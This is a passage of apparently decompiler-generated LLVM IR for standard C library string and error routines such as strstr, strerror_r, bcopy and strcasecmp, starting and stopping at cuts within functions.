dec_label_pc_1001c18c:                            ; preds = %dec_label_pc_1001c17c, %dec_label_pc_1001c1e4
  %v0_1001c12c = phi i32 [ %v1_1001c190, %dec_label_pc_1001c1e4 ], [ %v0_1001c180, %dec_label_pc_1001c17c ]
  %v1_1001c18c = inttoptr i32 %v0_1001c12c to i32*
  %v2_1001c18c = load i32, i32* %v1_1001c18c, align 4
  %v1_1001c190 = add i32 %v0_1001c12c, 4
  store i32 %v1_1001c190, i32* @r11, align 4
  store i32 %v0_1001c12c, i32* @r8, align 4
  %v1_1001c19c = add i32 %v2_1001c18c, -16843009
  %v2_1001c1a0 = and i32 %v1_1001c19c, -2139062144
  %v5_1001c1a0 = icmp eq i32 %v2_1001c1a0, 0
  %v1_1001c1a4 = add i32 %v0_1001c12c, 1
  br i1 %v5_1001c1a0, label %dec_label_pc_1001c1e4, label %dec_label_pc_1001c1ac

dec_label_pc_1001c1ac:                            ; preds = %dec_label_pc_1001c18c
  %v2_1001c1ac = inttoptr i32 %v0_1001c12c to i8*
  %v3_1001c1ac = load i8, i8* %v2_1001c1ac, align 1
  %v3_1001c1b0 = icmp eq i8 %v3_1001c1ac, 0
  br i1 %v3_1001c1b0, label %dec_label_pc_1001c12c, label %dec_label_pc_1001c1b8

dec_label_pc_1001c1b8:                            ; preds = %dec_label_pc_1001c1ac
  %v2_1001c1b8 = inttoptr i32 %v1_1001c1a4 to i8*
  %v3_1001c1b8 = load i8, i8* %v2_1001c1b8, align 1
  %v3_1001c1bc = icmp eq i8 %v3_1001c1b8, 0
  br i1 %v3_1001c1bc, label %dec_label_pc_1001c1f0, label %dec_label_pc_1001c1c4

dec_label_pc_1001c1c4:                            ; preds = %dec_label_pc_1001c1b8
  %v1_1001c1c4 = add i32 %v0_1001c12c, 2
  %v2_1001c1c4 = inttoptr i32 %v1_1001c1c4 to i8*
  %v3_1001c1c4 = load i8, i8* %v2_1001c1c4, align 1
  %v3_1001c1cc = icmp eq i8 %v3_1001c1c4, 0
  br i1 %v3_1001c1cc, label %dec_label_pc_1001c1f0, label %dec_label_pc_1001c1d4

dec_label_pc_1001c1d4:                            ; preds = %dec_label_pc_1001c1c4
  %v1_1001c1d4 = add i32 %v0_1001c12c, 3
  %v2_1001c1d4 = inttoptr i32 %v1_1001c1d4 to i8*
  %v3_1001c1d4 = load i8, i8* %v2_1001c1d4, align 1
  %v3_1001c1dc = icmp eq i8 %v3_1001c1d4, 0
  br i1 %v3_1001c1dc, label %dec_label_pc_1001c1f0, label %dec_label_pc_1001c1e4

dec_label_pc_1001c1e4:                            ; preds = %dec_label_pc_1001c1d4, %dec_label_pc_1001c18c
  %v2_1001c1e8 = icmp ult i32 %v1_1001c190, %v0_1001c1f4
  br i1 %v2_1001c1e8, label %dec_label_pc_1001c18c, label %dec_label_pc_1001c1f0

dec_label_pc_1001c1f0:                            ; preds = %dec_label_pc_1001c1e4, %dec_label_pc_1001c1b8, %dec_label_pc_1001c1c4, %dec_label_pc_1001c1d4, %dec_label_pc_1001c17c, %dec_label_pc_1001c12c
  %v0_1001c1fc = phi i32 [ %v0_1001c12c, %dec_label_pc_1001c12c ], [ %v0_1001c180, %dec_label_pc_1001c17c ], [ %v1_1001c1d4, %dec_label_pc_1001c1d4 ], [ %v1_1001c1c4, %dec_label_pc_1001c1c4 ], [ %v1_1001c1a4, %dec_label_pc_1001c1b8 ], [ %v0_1001c1f4, %dec_label_pc_1001c1e4 ]
  %v3_1001c1f0 = icmp ugt i32 %v0_1001c1f4, %v0_1001c1fc
  %v0_1001c1fc.v0_1001c1f4 = select i1 %v3_1001c1f0, i32 %v0_1001c1fc, i32 %v0_1001c1f4
  %v2_1001c200 = sub i32 %v0_1001c1fc.v0_1001c1f4, %v0_1001c134
  ret i32 %v2_1001c200

; uselistorder directives
  uselistorder i32 %v1_1001c190, { 1, 2, 0 }
  uselistorder i32 %v0_1001c12c, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1001c180, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1001c170, { 1, 0, 2 }
  uselistorder i32 %v0_1001c164, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1001c1f4, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1001c134, { 1, 0 }
  uselistorder i32 %v0_1001c134, { 4, 3, 5, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_1001c1f0, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1001c18c, { 1, 0 }
  uselistorder label %dec_label_pc_1001c14c, { 1, 0 }
  uselistorder label %dec_label_pc_1001c144, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1001c208 = load i8, i8* %arg2, align 1
  %v4_1001c208 = zext i8 %v3_1001c208 to i32
  store i32 %v4_1001c208, i32* %r6.global-to-local, align 4
  %v3_1001c20c = icmp eq i8 %v3_1001c208, 0
  %v0_1001c210 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c20c, i32 %v0_1001c210)
  %v1_1001c214 = add i32 %arg1, -1
  store i32 %v1_1001c214, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c218

dec_label_pc_1001c218:                            ; preds = %dec_label_pc_1001c228, %entry
  %v0_1001c218 = phi i32 [ %v1_1001c218, %dec_label_pc_1001c228 ], [ %v1_1001c214, %entry ]
  %v1_1001c218 = add i32 %v0_1001c218, 1
  %v2_1001c218 = inttoptr i32 %v1_1001c218 to i8*
  %v3_1001c218 = load i8, i8* %v2_1001c218, align 1
  store i32 %v1_1001c218, i32* %r3.global-to-local, align 4
  %v3_1001c21c = icmp eq i8 %v3_1001c218, 0
  br i1 %v3_1001c21c, label %dec_label_pc_1001c2f4, label %dec_label_pc_1001c228

dec_label_pc_1001c228:                            ; preds = %dec_label_pc_1001c218
  %v4_1001c220 = icmp eq i8 %v3_1001c218, %v3_1001c208
  br i1 %v4_1001c220, label %dec_label_pc_1001c22c, label %dec_label_pc_1001c218

dec_label_pc_1001c22c:                            ; preds = %dec_label_pc_1001c228
  %v2_1001c22c = add i32 %tmp, 1
  %v3_1001c22c = inttoptr i32 %v2_1001c22c to i8*
  %v4_1001c22c = load i8, i8* %v3_1001c22c, align 1
  %v5_1001c22c = zext i8 %v4_1001c22c to i32
  store i32 %v5_1001c22c, i32* %r5.global-to-local, align 4
  store i32 %v2_1001c22c, i32* %r4.global-to-local, align 4
  %v3_1001c234 = icmp eq i8 %v4_1001c22c, 0
  %v0_1001c238 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c234, i32 %v0_1001c238)
  %v0_1001c23c.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001c280

dec_label_pc_1001c248:                            ; preds = %dec_label_pc_1001c2e8
  %v3_1001c248 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1001c248 = zext i8 %v3_1001c248 to i32
  store i32 %v1_1001c23c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001c270.preheader

dec_label_pc_1001c270.preheader:                  ; preds = %dec_label_pc_1001c248, %dec_label_pc_1001c280
  %v0_1001c27017 = phi i32 [ %v4_1001c248, %dec_label_pc_1001c248 ], [ %storemerge4, %dec_label_pc_1001c280 ]
  %v1_1001c270.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1001c27025 = icmp eq i32 %v0_1001c27017, %v1_1001c270.pre
  %v3_1001c27427 = icmp eq i32 %v0_1001c27017, 0
  br i1 %v4_1001c27025, label %dec_label_pc_1001c280, label %dec_label_pc_1001c254

dec_label_pc_1001c254:                            ; preds = %dec_label_pc_1001c270.preheader, %dec_label_pc_1001c26c
  %v3_1001c27429 = phi i1 [ %v3_1001c274, %dec_label_pc_1001c26c ], [ %v3_1001c27427, %dec_label_pc_1001c270.preheader ]
  %v0_1001c25828 = phi i32 [ %v1_1001c26c, %dec_label_pc_1001c26c ], [ %v1_1001c23c, %dec_label_pc_1001c270.preheader ]
  br i1 %v3_1001c27429, label %dec_label_pc_1001c2f4, label %dec_label_pc_1001c258

dec_label_pc_1001c258:                            ; preds = %dec_label_pc_1001c254
  %v1_1001c258 = add i32 %v0_1001c25828, 1
  %v2_1001c258 = inttoptr i32 %v1_1001c258 to i8*
  %v3_1001c258 = load i8, i8* %v2_1001c258, align 1
  %v4_1001c258 = zext i8 %v3_1001c258 to i32
  store i32 %v1_1001c258, i32* %r11.global-to-local, align 4
  %v4_1001c25c = icmp eq i32 %v4_1001c258, %v1_1001c270.pre
  br i1 %v4_1001c25c, label %dec_label_pc_1001c280, label %dec_label_pc_1001c268

dec_label_pc_1001c268:                            ; preds = %dec_label_pc_1001c258
  %v3_1001c260 = icmp eq i8 %v3_1001c258, 0
  br i1 %v3_1001c260, label %dec_label_pc_1001c2f4, label %dec_label_pc_1001c26c

dec_label_pc_1001c26c:                            ; preds = %dec_label_pc_1001c268
  %v1_1001c26c = add i32 %v0_1001c25828, 2
  %v2_1001c26c = inttoptr i32 %v1_1001c26c to i8*
  %v3_1001c26c = load i8, i8* %v2_1001c26c, align 1
  %v4_1001c26c = zext i8 %v3_1001c26c to i32
  store i32 %v1_1001c26c, i32* %r11.global-to-local, align 4
  %v4_1001c270 = icmp eq i32 %v4_1001c26c, %v1_1001c270.pre
  %v3_1001c274 = icmp eq i8 %v3_1001c26c, 0
  br i1 %v4_1001c270, label %dec_label_pc_1001c280, label %dec_label_pc_1001c254

dec_label_pc_1001c280:                            ; preds = %dec_label_pc_1001c270.preheader, %dec_label_pc_1001c26c, %dec_label_pc_1001c258, %dec_label_pc_1001c22c
  %v0_1001c23c.sink = phi i32 [ %v0_1001c23c.sink.pre, %dec_label_pc_1001c22c ], [ %v1_1001c23c, %dec_label_pc_1001c270.preheader ], [ %v1_1001c26c, %dec_label_pc_1001c26c ], [ %v1_1001c258, %dec_label_pc_1001c258 ]
  %v1_1001c23c = add i32 %v0_1001c23c.sink, 1
  %storemerge4.in.in = inttoptr i32 %v1_1001c23c to i8*
  %storemerge4.in = load i8, i8* %storemerge4.in.in, align 1
  %storemerge4 = zext i8 %storemerge4.in to i32
  store i32 %v1_1001c23c, i32* %r11.global-to-local, align 4
  %v1_1001c280 = load i32, i32* %r5.global-to-local, align 4
  %v4_1001c280 = icmp eq i32 %storemerge4, %v1_1001c280
  br i1 %v4_1001c280, label %dec_label_pc_1001c288, label %dec_label_pc_1001c270.preheader

dec_label_pc_1001c288:                            ; preds = %dec_label_pc_1001c280
  %v1_1001c288 = add i32 %v0_1001c23c.sink, 2
  %v2_1001c288 = inttoptr i32 %v1_1001c288 to i8*
  %v3_1001c288 = load i8, i8* %v2_1001c288, align 1
  %v4_1001c288 = zext i8 %v3_1001c288 to i32
  store i32 %v4_1001c288, i32* @r10, align 4
  store i32 %v0_1001c23c.sink, i32* %r3.global-to-local, align 4
  %v0_1001c290 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001c290 = add i32 %v0_1001c290, 1
  %v2_1001c290 = inttoptr i32 %v1_1001c290 to i8*
  %v3_1001c290 = load i8, i8* %v2_1001c290, align 1
  %v4_1001c290 = zext i8 %v3_1001c290 to i32
  store i32 %v1_1001c290, i32* @r8, align 4
  store i32 %v1_1001c288, i32* %r11.global-to-local, align 4
  %v4_1001c29c = icmp eq i8 %v3_1001c288, %v3_1001c290
  br i1 %v4_1001c29c, label %dec_label_pc_1001c2a4, label %dec_label_pc_1001c2e8

dec_label_pc_1001c2a4:                            ; preds = %dec_label_pc_1001c288, %dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge
  %v0_1001c2ac = phi i32 [ %v0_1001c2ac.pre, %dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge ], [ %v1_1001c290, %dec_label_pc_1001c288 ]
  %v0_1001c2a8 = phi i32 [ %v0_1001c2a8.pre, %dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge ], [ %v1_1001c288, %dec_label_pc_1001c288 ]
  %v0_1001c2a4 = phi i32 [ %v4_1001c2d4, %dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge ], [ %v4_1001c288, %dec_label_pc_1001c288 ]
  %v3_1001c2a4 = icmp eq i32 %v0_1001c2a4, 0
  %v1_1001c2a8 = add i32 %v0_1001c2a8, 1
  store i32 %v1_1001c2a8, i32* %r7.global-to-local, align 4
  %v1_1001c2ac = add i32 %v0_1001c2ac, 1
  store i32 %v1_1001c2ac, i32* @r10, align 4
  %v0_1001c2b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c2a4, i32 %v0_1001c2b0)
  %v0_1001c2b4 = load i32, i32* @r8, align 4
  %v1_1001c2b4 = add i32 %v0_1001c2b4, 1
  %v2_1001c2b4 = inttoptr i32 %v1_1001c2b4 to i8*
  %v3_1001c2b4 = load i8, i8* %v2_1001c2b4, align 1
  %v4_1001c2b4 = zext i8 %v3_1001c2b4 to i32
  %v0_1001c2b8 = load i32, i32* @r10, align 4
  %v1_1001c2b8 = add i32 %v0_1001c2b8, 1
  store i32 %v1_1001c2b8, i32* @r8, align 4
  %v0_1001c2bc = load i32, i32* %r11.global-to-local, align 4
  %v1_1001c2bc = add i32 %v0_1001c2bc, 1
  %v2_1001c2bc = inttoptr i32 %v1_1001c2bc to i8*
  %v3_1001c2bc = load i8, i8* %v2_1001c2bc, align 1
  %v0_1001c2c0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001c2c0 = add i32 %v0_1001c2c0, 1
  store i32 %v1_1001c2c0, i32* %r11.global-to-local, align 4
  %v4_1001c2c8 = icmp eq i8 %v3_1001c2bc, %v3_1001c2b4
  br i1 %v4_1001c2c8, label %dec_label_pc_1001c2d0, label %dec_label_pc_1001c2e8

dec_label_pc_1001c2d0:                            ; preds = %dec_label_pc_1001c2a4
  %v3_1001c2c4 = icmp eq i8 %v3_1001c2b4, 0
  %v0_1001c2d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001c2c4, i32 %v0_1001c2d0)
  %v0_1001c2d4 = load i32, i32* @r10, align 4
  %v1_1001c2d4 = add i32 %v0_1001c2d4, 1
  %v2_1001c2d4 = inttoptr i32 %v1_1001c2d4 to i8*
  %v3_1001c2d4 = load i8, i8* %v2_1001c2d4, align 1
  %v4_1001c2d4 = zext i8 %v3_1001c2d4 to i32
  %v0_1001c2d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001c2d8 = add i32 %v0_1001c2d8, 1
  %v2_1001c2d8 = inttoptr i32 %v1_1001c2d8 to i8*
  %v3_1001c2d8 = load i8, i8* %v2_1001c2d8, align 1
  store i32 %v4_1001c2d4, i32* @r10, align 4
  %v4_1001c2e0 = icmp eq i8 %v3_1001c2d8, %v3_1001c2d4
  br i1 %v4_1001c2e0, label %dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge, label %dec_label_pc_1001c2e8

dec_label_pc_1001c2d0.dec_label_pc_1001c2a4_crit_edge: ; preds = %dec_label_pc_1001c2d0
  %v0_1001c2a8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001c2ac.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001c2a4

dec_label_pc_1001c2e8:                            ; preds = %dec_label_pc_1001c2d0, %dec_label_pc_1001c2a4, %dec_label_pc_1001c288
  %v0_1001c2e8 = phi i32 [ %v4_1001c290, %dec_label_pc_1001c288 ], [ %v4_1001c2d4, %dec_label_pc_1001c2d0 ], [ %v4_1001c2b4, %dec_label_pc_1001c2a4 ]
  %v3_1001c2e8 = icmp eq i32 %v0_1001c2e8, 0
  br i1 %v3_1001c2e8, label %dec_label_pc_1001c2f0, label %dec_label_pc_1001c248

dec_label_pc_1001c2f0:                            ; preds = %dec_label_pc_1001c2e8
  ret i32 %v0_1001c23c.sink

dec_label_pc_1001c2f4:                            ; preds = %dec_label_pc_1001c218, %dec_label_pc_1001c268, %dec_label_pc_1001c254
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1001c2d4, { 0, 2, 1 }
  uselistorder i8 %v3_1001c2b4, { 1, 0, 2 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i8* %storemerge4.in.in, { 1, 0 }
  uselistorder i32 %v1_1001c23c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1001c23c.sink, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1001c26c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1001c25828, { 1, 0 }
  uselistorder i32 %v1_1001c270.pre, { 1, 2, 0 }
  uselistorder i32 %v1_1001c218, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 0 }
  uselistorder label %dec_label_pc_1001c2f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001c2a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001c280, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1001c254, { 1, 0 }
  uselistorder label %dec_label_pc_1001c270.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268550932, i32* @lr, align 4
  %v0_1001c310 = call i32 @__xpg_strerror_r()
  %v0_1001c318 = load i32, i32* @r29, align 4
  ret i32 %v0_1001c318
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_1001c32c = load i32, i32* @r3, align 4
  %v2_1001c32c = icmp ugt i32 %v0_1001c32c, 124
  %v0_1001c33c = load i32, i32* @r4, align 4
  store i32 %v0_1001c33c, i32* %r27.global-to-local, align 4
  %v0_1001c344 = load i32, i32* @r5, align 4
  br i1 %v2_1001c32c, label %dec_label_pc_1001c388, label %dec_label_pc_1001c34c

dec_label_pc_1001c34c:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1002e4c0.1184 to i32), i32* @r30, align 4
  store i32 83, i32* @r11, align 4
  %v3_1001c3687 = icmp eq i32 %v0_1001c32c, 0
  br i1 %v3_1001c3687, label %dec_label_pc_1001c37c, label %dec_label_pc_1001c35c

dec_label_pc_1001c35c:                            ; preds = %dec_label_pc_1001c34c, %dec_label_pc_1001c35c
  br label %dec_label_pc_1001c35c

dec_label_pc_1001c37c:                            ; preds = %dec_label_pc_1001c34c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c3bc

dec_label_pc_1001c388:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_1001c32c, 0
  %v1_1001c38c = zext i1 %tmp to i32
  %v2_1001c38c = ashr i32 %v0_1001c32c, 31
  %v3_1001c38c = and i32 %v2_1001c38c, -2
  %v4_1001c38c = or i32 %v3_1001c38c, %v1_1001c38c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_1001c3a0 = bitcast i32* %stack_var_-39 to i8*
  %v6_1001c3a0 = call i32 @_uintmaxtostr(i8* %v5_1001c3a0, i32 %v4_1001c38c, i32 %v0_1001c32c, i32 -10, i32 0)
  %v1_1001c3a8 = add i32 %v6_1001c3a0, -14
  store i32 %v1_1001c3a8, i32* @r30, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1002e4b0.1185 to i32), i32* @r4, align 4
  store i32 %v1_1001c3a8, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268551100, i32* @lr, align 4
  %v0_1001c3b8 = call i32 @memcpy()
  %v0_1001c3bc.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1001c3c0.pre = load i32, i32* @r30, align 4
  %v0_1001c3d0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001c3bc

dec_label_pc_1001c3bc:                            ; preds = %dec_label_pc_1001c37c, %dec_label_pc_1001c388
  %v0_1001c3d0 = phi i32 [ %v0_1001c344, %dec_label_pc_1001c37c ], [ %v0_1001c3d0.pre, %dec_label_pc_1001c388 ]
  %v0_1001c3c0 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1002e4c0.1184 to i32), %dec_label_pc_1001c37c ], [ %v0_1001c3c0.pre, %dec_label_pc_1001c388 ]
  %v1_1001c3c4 = phi i32 [ %v0_1001c33c, %dec_label_pc_1001c37c ], [ %v0_1001c3bc.pre, %dec_label_pc_1001c388 ]
  %tmp19 = icmp slt i32 %v1_1001c3c4, 0
  %v1_1001c3bc = zext i1 %tmp19 to i32
  %v2_1001c3bc = ashr i32 %v1_1001c3c4, 31
  %v3_1001c3bc = and i32 %v2_1001c3bc, -2
  %v4_1001c3bc = or i32 %v3_1001c3bc, %v1_1001c3bc
  store i32 %v0_1001c3c0, i32* @r3, align 4
  %v2_1001c3c4 = xor i32 %v4_1001c3bc, %v1_1001c3c4
  %v2_1001c3c8 = sub i32 %v4_1001c3bc, %v2_1001c3c4
  %tmp20 = icmp slt i32 %v2_1001c3c8, 0
  %v1_1001c3cc = zext i1 %tmp20 to i32
  %v2_1001c3cc = ashr i32 %v2_1001c3c8, 31
  %v3_1001c3cc = and i32 %v2_1001c3cc, -2
  %v4_1001c3cc = or i32 %v3_1001c3cc, %v1_1001c3cc
  %v2_1001c3d0 = and i32 %v4_1001c3cc, %v0_1001c3d0
  store i32 %v2_1001c3d0, i32* @r29, align 4
  %v0_1001c3d4 = call i32 @__GI_strlen()
  %v1_1001c3d8 = add i32 %v0_1001c3d4, 1
  store i32 %v1_1001c3d8, i32* @r31, align 4
  %v1_1001c3dc = load i32, i32* @r29, align 4
  %v3_1001c3dc = icmp ugt i32 %v1_1001c3d8, %v1_1001c3dc
  br i1 %v3_1001c3dc, label %dec_label_pc_1001c3e4, label %dec_label_pc_1001c3ec

dec_label_pc_1001c3e4:                            ; preds = %dec_label_pc_1001c3bc
  store i32 %v1_1001c3dc, i32* @r31, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c3ec

dec_label_pc_1001c3ec:                            ; preds = %dec_label_pc_1001c3bc, %dec_label_pc_1001c3e4
  %v0_1001c3fc = phi i32 [ %v1_1001c3dc, %dec_label_pc_1001c3e4 ], [ %v1_1001c3d8, %dec_label_pc_1001c3bc ]
  %v3_1001c3ec = icmp eq i32 %v0_1001c3fc, 0
  br i1 %v3_1001c3ec, label %dec_label_pc_1001c410, label %dec_label_pc_1001c3f4

dec_label_pc_1001c3f4:                            ; preds = %dec_label_pc_1001c3ec
  %v0_1001c3f4 = load i32, i32* @r30, align 4
  store i32 %v0_1001c3f4, i32* @r4, align 4
  %v0_1001c3f8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_1001c3f8, i32* @r3, align 4
  store i32 %v0_1001c3fc, i32* @r5, align 4
  store i32 268551172, i32* @lr, align 4
  %v0_1001c400 = call i32 @memcpy()
  %v1_1001c404 = load i32, i32* @r31, align 4
  %v2_1001c404 = add i32 %v1_1001c404, %v0_1001c3f8
  %v3_1001c40c = add i32 %v2_1001c404, -1
  %v4_1001c40c = inttoptr i32 %v3_1001c40c to i8*
  store i8 0, i8* %v4_1001c40c, align 1
  br label %dec_label_pc_1001c410

dec_label_pc_1001c410:                            ; preds = %dec_label_pc_1001c3ec, %dec_label_pc_1001c3f4
  %v0_1001c410 = load i32, i32* %r28.global-to-local, align 4
  %v3_1001c410 = icmp eq i32 %v0_1001c410, 0
  br i1 %v3_1001c410, label %dec_label_pc_1001c420, label %dec_label_pc_1001c418

dec_label_pc_1001c418:                            ; preds = %dec_label_pc_1001c410
  %v0_1001c418 = call i32 @__errno_location()
  %v0_1001c41c = load i32, i32* %r28.global-to-local, align 4
  %v2_1001c41c = inttoptr i32 %v0_1001c418 to i32*
  store i32 %v0_1001c41c, i32* %v2_1001c41c, align 4
  %v0_1001c424.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1001c420

dec_label_pc_1001c420:                            ; preds = %dec_label_pc_1001c410, %dec_label_pc_1001c418
  %v0_1001c424 = phi i32 [ 0, %dec_label_pc_1001c410 ], [ %v0_1001c424.pre, %dec_label_pc_1001c418 ]
  ret i32 %v0_1001c424

; uselistorder directives
  uselistorder i32 %v2_1001c3c8, { 1, 0 }
  uselistorder i32 %v4_1001c3bc, { 1, 0 }
  uselistorder i32 %v1_1001c3c4, { 1, 2, 0 }
  uselistorder i32 %v0_1001c32c, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c420, { 1, 0 }
  uselistorder label %dec_label_pc_1001c410, { 1, 0 }
  uselistorder label %dec_label_pc_1001c3ec, { 1, 0 }
  uselistorder label %dec_label_pc_1001c3bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001c35c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1001c444 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_1001c444
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001c44c = load i32, i32* bitcast (i32** @global_var_10045164.1186 to i32*), align 4
  store i32 %v3_1001c44c, i32* @r10, align 4
  %v0_1001c454.pre = load i32, i32* @r3, align 4
  %v1_1001c454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001c454

dec_label_pc_1001c454:                            ; preds = %dec_label_pc_1001c47c, %entry
  %v0_1001c4906 = phi i32 [ %v0_1001c4907, %dec_label_pc_1001c47c ], [ 0, %entry ]
  %v0_1001c480 = phi i32 [ %v1_1001c480, %dec_label_pc_1001c47c ], [ %v1_1001c454.pre, %entry ]
  %v0_1001c484 = phi i32 [ %v1_1001c484, %dec_label_pc_1001c47c ], [ %v0_1001c454.pre, %entry ]
  %v4_1001c454 = icmp eq i32 %v0_1001c484, %v0_1001c480
  %.pre = inttoptr i32 %v0_1001c484 to i8*
  br i1 %v4_1001c454, label %dec_label_pc_1001c47c, label %dec_label_pc_1001c45c

dec_label_pc_1001c45c:                            ; preds = %dec_label_pc_1001c454
  %v2_1001c45c = load i8, i8* %.pre, align 1
  %v3_1001c45c = zext i8 %v2_1001c45c to i32
  %v1_1001c460 = inttoptr i32 %v0_1001c480 to i8*
  %v2_1001c460 = load i8, i8* %v1_1001c460, align 1
  %v3_1001c460 = zext i8 %v2_1001c460 to i32
  %v1_1001c464 = mul nuw nsw i32 %v3_1001c45c, 2
  %v1_1001c468 = mul nuw nsw i32 %v3_1001c460, 2
  %v2_1001c46c = add i32 %v1_1001c464, %v3_1001c44c
  %v3_1001c46c = inttoptr i32 %v2_1001c46c to i16*
  %v4_1001c46c = load i16, i16* %v3_1001c46c, align 2
  %v5_1001c46c = sext i16 %v4_1001c46c to i32
  %v2_1001c470 = add i32 %v1_1001c468, %v3_1001c44c
  %v3_1001c470 = inttoptr i32 %v2_1001c470 to i16*
  %v4_1001c470 = load i16, i16* %v3_1001c470, align 2
  %v5_1001c470 = sext i16 %v4_1001c470 to i32
  %v2_1001c474 = sub nsw i32 %v5_1001c46c, %v5_1001c470
  %v4_1001c478 = icmp eq i16 %v4_1001c46c, %v4_1001c470
  br i1 %v4_1001c478, label %dec_label_pc_1001c47c, label %dec_label_pc_1001c490

dec_label_pc_1001c47c:                            ; preds = %dec_label_pc_1001c454, %dec_label_pc_1001c45c
  %v0_1001c4907 = phi i32 [ %v2_1001c474, %dec_label_pc_1001c45c ], [ %v0_1001c4906, %dec_label_pc_1001c454 ]
  %v2_1001c47c = load i8, i8* %.pre, align 1
  %v1_1001c480 = add i32 %v0_1001c480, 1
  %v1_1001c484 = add i32 %v0_1001c484, 1
  %v3_1001c488 = icmp eq i8 %v2_1001c47c, 0
  br i1 %v3_1001c488, label %dec_label_pc_1001c490, label %dec_label_pc_1001c454

dec_label_pc_1001c490:                            ; preds = %dec_label_pc_1001c47c, %dec_label_pc_1001c45c
  %v0_1001c490 = phi i32 [ %v0_1001c4907, %dec_label_pc_1001c47c ], [ %v2_1001c474, %dec_label_pc_1001c45c ]
  ret i32 %v0_1001c490

; uselistorder directives
  uselistorder i32 %v2_1001c474, { 1, 0 }
  uselistorder i32 %v0_1001c484, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001c47c, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v3_1001c4a0 = load i32, i32* bitcast (i32** @global_var_10045164.1186 to i32*), align 4
